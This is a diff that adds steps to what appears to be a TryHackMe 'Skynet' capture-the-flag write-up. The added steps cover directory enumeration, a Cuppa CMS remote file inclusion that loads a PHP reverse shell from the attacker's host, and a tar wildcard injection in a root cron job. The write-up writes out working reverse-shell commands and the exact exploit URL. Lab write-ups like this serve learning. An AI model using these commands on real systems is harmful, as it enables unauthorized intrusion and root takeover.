@@ -70,8 +70,102 @@ and we have this file ''important.txt""
 
 idk if it's really important ..
 
+so we go to the hidden directory on the web server
 
+```
+http://skynet.thm/45kra24zxs28v3yd
+```
 
+and we run a gobuster on it
+
+```
+gobuster dir -u http://skynet.thm/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/common.txt
+```
+
+we find an `/administrator` directory, and inside it's a **Cuppa CMS** login page
+
+Cuppa CMS is vulnerable to a **Remote File Inclusion (RFI)** via `alertConfigField.php`
+
+so first we copy a php reverse shell to our workspace
+
+```
+cp /opt/lists/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php /workspace/shell.php
+```
+
+we edit the file to put our tun0 IP and port 4444
+
+```
+sed -i "s/127.0.0.1/192.168.223.161/" /workspace/shell.php
+sed -i "s/CHANGETHIS/192.168.223.161/" /workspace/shell.php
+```
+
+then we start a http server to host the shell
+
+```
+python3 -m http.server 8888
+```
+
+we start our listener in another terminal
+
+```
+nc -lvnp 4444
+```
+
+and we trigger the RFI
+
+the file `alertConfigField.php` in Cuppa CMS has a parameter called `urlConfig` that is supposed to load a local config file, but it doesn't sanitize the input at all. It just takes whatever URL you give it and includes it directly with PHP. So instead of giving it a local file, we give it a remote URL pointing to our machine — that's the **Remote File Inclusion (RFI)**. The target server fetches our `shell.php` from our http server (port 8888) and executes it as PHP on its side. Inside `shell.php` there's a reverse connection back to our listener (port 4444). So two things happen: port 8888 serves the file, port 4444 receives the shell.
+
+```
+curl "http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.223.161:8888/shell.php"
+```
+
+and we got a shell as **www-data**
+
+now for **privilege escalation**, we check the crontab
+
+```
+cat /etc/crontab
+```
+
+there's a cron running every minute as **root**
+
+```
+*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
+```
+
+and the backup script does this
+
+```bash
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+```
+
+the wildcard `*` in tar is exploitable, it's called **tar wildcard injection** — tar interprets filenames as options
+
+so we create our payload in `/var/www/html`
+
+```
+cd /var/www/html
+printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.223.161/5555 0>&1\n' > shell.sh
+chmod +x shell.sh
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=bash shell.sh"
+```
+
+we start a new listener
+
+```
+nc -lvnp 5555
+```
+
+we wait about 1 minute and we get a shell as **root**
+
+```
+cd /root
+cat root.txt
+
+<img width="399" height="204" alt="image" src="https://github.com/user-attachments/assets/4002d3c6-163f-4c8f-89d5-59a948aaf015" />
 
 
 
